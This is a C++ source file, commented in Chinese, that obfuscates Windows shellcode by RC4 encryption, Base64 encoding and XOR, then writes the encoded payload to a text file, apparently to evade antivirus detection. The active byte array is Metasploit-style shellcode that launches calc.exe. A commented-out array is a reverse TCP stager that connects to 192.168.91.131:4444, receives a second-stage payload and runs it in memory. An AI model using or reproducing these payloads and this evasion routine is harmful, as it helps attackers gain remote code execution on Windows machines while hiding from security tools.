#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <iostream>
#include "base64.h"
#include "RC4.h"

using namespace std;
unsigned char hexData[193] = {
	0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, 0x50, 0x30, 0x8B,
	0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
	0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1, 0x51, 0x8B, 0x59, 0x20,
	0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC,
	0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
	0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3,
	0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF,
	0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
	0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x68, 0xA6,
	0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x53, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65,
	0x00
};

//------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : Untitled1
// Address : 0 (0x0)
// Size    : 354 (0x162)
//------------------------------------------------------------
//unsigned char hexData[354] = {
//	0xFC, 0xE8, 0x8F, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xD2, 0x64, 0x8B, 0x52, 0x30, 0x8B,
//	0x52, 0x0C, 0x8B, 0x52, 0x14, 0x31, 0xFF, 0x0F, 0xB7, 0x4A, 0x26, 0x8B, 0x72, 0x28, 0x31, 0xC0,
//	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x49, 0x75, 0xEF, 0x52,
//	0x8B, 0x52, 0x10, 0x57, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x8B, 0x40, 0x78, 0x85, 0xC0, 0x74, 0x4C,
//	0x01, 0xD0, 0x50, 0x8B, 0x58, 0x20, 0x01, 0xD3, 0x8B, 0x48, 0x18, 0x85, 0xC9, 0x74, 0x3C, 0x49,
//	0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38,
//	0xE0, 0x75, 0xF4, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75, 0xE0, 0x58, 0x8B, 0x58, 0x24, 0x01,
//	0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89,
//	0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0, 0x58, 0x5F, 0x5A, 0x8B, 0x12,
//	0xE9, 0x80, 0xFF, 0xFF, 0xFF, 0x5D, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5F,
//	0x54, 0x68, 0x4C, 0x77, 0x26, 0x07, 0x89, 0xE8, 0xFF, 0xD0, 0xB8, 0x90, 0x01, 0x00, 0x00, 0x29,
//	0xC4, 0x54, 0x50, 0x68, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x6A, 0x0A, 0x68, 0xC0, 0xA8, 0x5B,
//	0x83, 0x68, 0x02, 0x00, 0x11, 0x5C, 0x89, 0xE6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50,
//	0x68, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x97, 0x6A, 0x10, 0x56, 0x57, 0x68, 0x99, 0xA5, 0x74,
//	0x61, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0x0A, 0xFF, 0x4E, 0x08, 0x75, 0xEC, 0xE8, 0x67, 0x00, 0x00,
//	0x00, 0x6A, 0x00, 0x6A, 0x04, 0x56, 0x57, 0x68, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5, 0x83, 0xF8,
//	0x00, 0x7E, 0x36, 0x8B, 0x36, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6A, 0x00, 0x68,
//	0x58, 0xA4, 0x53, 0xE5, 0xFF, 0xD5, 0x93, 0x53, 0x6A, 0x00, 0x56, 0x53, 0x57, 0x68, 0x02, 0xD9,
//	0xC8, 0x5F, 0xFF, 0xD5, 0x83, 0xF8, 0x00, 0x7D, 0x28, 0x58, 0x68, 0x00, 0x40, 0x00, 0x00, 0x6A,
//	0x00, 0x50, 0x68, 0x0B, 0x2F, 0x0F, 0x30, 0xFF, 0xD5, 0x57, 0x68, 0x75, 0x6E, 0x4D, 0x61, 0xFF,
//	0xD5, 0x5E, 0x5E, 0xFF, 0x0C, 0x24, 0x0F, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0xE9, 0x9B, 0xFF, 0xFF,
//	0xFF, 0x01, 0xC3, 0x29, 0xC6, 0x75, 0xC1, 0xC3, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x6A, 0x00, 0x53,
//	0xFF, 0xD5
//};

void CreatetoFile(const char* FILEPATH, char* szBuffer, int length) {



	//创建文件
	HANDLE FILE_HANDLE = CreateFile(FILEPATH, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD lpNumberOfBytesWritten;
	//写入文件
	bool status_code = WriteFile(FILE_HANDLE, szBuffer, length, &lpNumberOfBytesWritten, NULL);
	if (!status_code)
	{
		cout << "WriteFile failed" << endl;
		return;
	}


}

void xorcode(char* buffer, int hexlength, char Key)
{

	for (size_t i = 0; i < hexlength; i++)
	{
		buffer[i] ^= Key;

	}
}

int main(void)
{
	/*
		RC4 rc4encode;
	const char* key = "password";
	rc4encode.rc4_init((unsigned char*)key, sizeof(key));
	rc4encode.do_crypt((unsigned char*) & hexData, sizeof(hexData));
	xorcode((char*)&hexData, sizeof(hexData), 0x69);
	string base64Code = base64_encode((const char*)hexData, sizeof(hexData));
	const char* FILEPATH = "shellcode_rc4_xor_base64.txt";
	//CreatetoFile(FILEPATH, (char*)hexData, sizeof(hexData));
	CreatetoFile(FILEPATH, (char *)base64Code.c_str(), base64Code.length());
	
	*/


	RC4 rc4encode;
	const char* key = "password";

	//第一道RC4加密
	rc4encode.rc4_init((unsigned char*)key, sizeof(key));
	rc4encode.do_crypt((unsigned char*)&hexData, sizeof(hexData));


	//第二道Base64加密
	string base64Code = base64_encode((const char*)hexData, sizeof(hexData));

	//第三道XOR加密
	xorcode((char*)base64Code.c_str(), base64Code.length(), 0x69);
	
	const char* FILEPATH = "shellcode_rc4_xor_base64.txt";
	//CreatetoFile(FILEPATH, (char*)hexData, sizeof(hexData));
	CreatetoFile(FILEPATH, (char*)base64Code.c_str(), base64Code.length());

	system("pause");
	return EXIT_SUCCESS;
}
